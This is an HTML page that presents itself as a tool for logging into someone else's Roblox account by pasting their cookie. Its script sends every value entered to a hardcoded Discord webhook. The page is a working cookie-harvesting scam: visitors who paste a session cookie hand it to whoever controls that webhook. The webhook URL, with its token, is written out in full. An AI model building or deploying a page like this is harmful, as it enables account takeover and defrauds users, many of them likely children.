<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Webhook Form</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { background: radial-gradient(circle at top, #0f172a, #020617); }
    .glow {
      box-shadow: 0 0 15px rgba(59,130,246,0.8), 0 0 30px rgba(59,130,246,0.6);
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen text-white p-4">
  <div class="grid md:grid-cols-2 gap-6 w-full max-w-4xl">
    <!-- Left: Form -->
    <div class="bg-slate-900 p-8 rounded-2xl glow">
      <h1 class="text-2xl font-bold text-center text-blue-400 mb-6">enter cookie</h1>
      <form id="webhookForm" class="space-y-4">
        <input type="text" id="userInput" placeholder="Enter cookie in here" required
          class="w-full p-3 rounded-lg bg-slate-800 border border-blue-500 text-white focus:ring-2 focus:ring-blue-400" />
        <button type="submit"
          class="w-full py-3 rounded-lg bg-blue-600 hover:bg-blue-500 text-lg font-semibold transition glow">
          Submit
        </button>
      </form>
      <p id="status" class="mt-4 text-center text-sm"></p>
    </div>

    <!-- Right: Explanation -->
    <div class="bg-slate-800 p-8 rounded-2xl glow">
      <h2 class="text-xl font-bold text-blue-400 mb-4">explantion about the site</h2>
      <p class="text-slate-300">
        This site let you put a cookie of someone in roblox and it will let you login into his account!
      </p>
    </div>
  </div>

  <script>
    const form = document.getElementById("webhookForm");
    const input = document.getElementById("userInput");
    const status = document.getElementById("status");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      status.textContent = "Sending...";

      try {
        const response = await fetch("https://discord.com/api/webhooks/1424104277571276960/Q6trwRgxtbz4TKn2Tes25-p8HCiyClLJgh2Q-v_b70uOE6ukwv53huXFRW9OoJiUW6RI", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: '`' + input.value + '`' })
        });

        if (response.ok) {
          status.textContent = "✅ Sent successfully!";
          input.value = "";
        } else {
          status.textContent = "❌ Failed to send.";
        }
      } catch (err) {
        status.textContent = "⚠️ Error: " + err.message;
      }
    });
  </script>
</body>
</html>
